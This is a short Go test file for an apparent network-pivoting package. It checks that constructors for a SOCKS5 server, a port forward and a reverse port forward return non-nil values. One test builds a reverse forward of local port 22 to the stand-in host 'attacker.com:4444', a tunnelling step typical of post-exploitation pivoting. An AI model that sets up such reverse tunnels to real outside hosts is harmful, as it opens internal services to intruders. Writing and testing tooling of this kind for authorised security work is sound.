package pivot

import (
	"testing"
)

func TestNewSOCKS5Server(t *testing.T) {
	server := NewSOCKS5Server("127.0.0.1:1080", "user", "pass")
	if server == nil {
		t.Errorf("NewSOCKS5Server() returned nil")
	}
}

func TestNewPortForward(t *testing.T) {
	forward := NewPortForward("127.0.0.1:8080", "target.com:80")
	if forward == nil {
		t.Errorf("NewPortForward() returned nil")
	}
}

func TestNewReversePortForward(t *testing.T) {
	reverse := NewReversePortForward("attacker.com:4444", 22)
	if reverse == nil {
		t.Errorf("NewReversePortForward() returned nil")
	}
}

func TestTestConnectivity(t *testing.T) {
	err := TestConnectivity("127.0.0.1:22", 2)
	if err == nil {
		t.Logf("TestConnectivity may require real SSH service")
	}
}
